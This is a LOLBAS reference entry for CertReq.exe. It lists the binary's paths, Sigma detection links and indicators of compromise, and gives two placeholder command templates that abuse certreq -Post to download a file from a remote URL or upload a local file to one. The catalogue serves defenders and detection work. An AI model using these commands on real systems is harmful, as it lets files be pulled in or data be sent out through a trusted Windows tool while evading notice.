---
title: "CertReq.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Certreq/
fetched_at: 2026-09-20T17:09:28Z
license: unspecified
category: windows
---

Used for requesting and managing certificates

## Paths
- C:\Windows\System32\certreq.exe
- C:\Windows\SysWOW64\certreq.exe

## Resources
- [https://dtm.uk/certreq](https://dtm.uk/certreq)

## Acknowledgements
- David Middlehurst ([@dtmsecurity](https://twitter.com/@dtmsecurity))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml)
- IOC: certreq creates new files
- IOC: certreq makes POST requests

## Download

1. Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).

```
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
```

   - Use case: Download file from Internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

2. Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.

```
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
```

   - Use case: Upload

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105
